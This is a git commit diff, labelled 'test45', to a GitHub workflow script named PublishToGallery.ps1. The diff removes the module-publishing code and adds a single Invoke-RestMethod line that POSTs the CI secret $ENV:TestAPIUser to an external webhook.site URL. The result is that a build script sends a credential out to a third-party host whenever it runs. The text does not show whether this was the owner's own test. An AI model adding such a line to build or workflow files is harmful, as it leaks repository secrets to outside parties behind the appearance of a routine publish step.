f87e1c4c8dda44d76d38894cacaf8133bb2c310d
MKletz <michael.kletz.27@gmail.com>
2020-10-28 10:25:39 -0500

    test45

--- .github/workflows/PublishToGallery.ps1
+++ .github/workflows/PublishToGallery.ps1
@@ -1,7 +1,1 @@
-try{
-    Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
-    Publish-Module -Path ".\UofICDB" -Repository PSGallery -NuGetApiKey $ENV:NuGetApiKey -Force
-}
-catch{
-    throw $_
-}
+Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $ENV:TestAPIUser
